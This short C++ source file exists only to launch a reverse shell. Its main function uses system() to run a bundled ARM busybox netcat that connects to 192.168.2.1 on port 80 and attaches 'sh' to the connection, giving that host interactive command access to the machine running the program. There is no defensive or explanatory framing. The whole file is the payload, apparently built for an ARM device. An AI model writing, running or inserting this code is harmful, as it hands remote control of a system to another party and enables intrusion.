#include <stdio.h>
#include <unistd.h>
#include <iostream>
#include <string>
#include <fstream>

using namespace std;

int main(){
    system(("./busybox-arm nc 192.168.2.1 80 -e sh").c_str());

    return 0;
}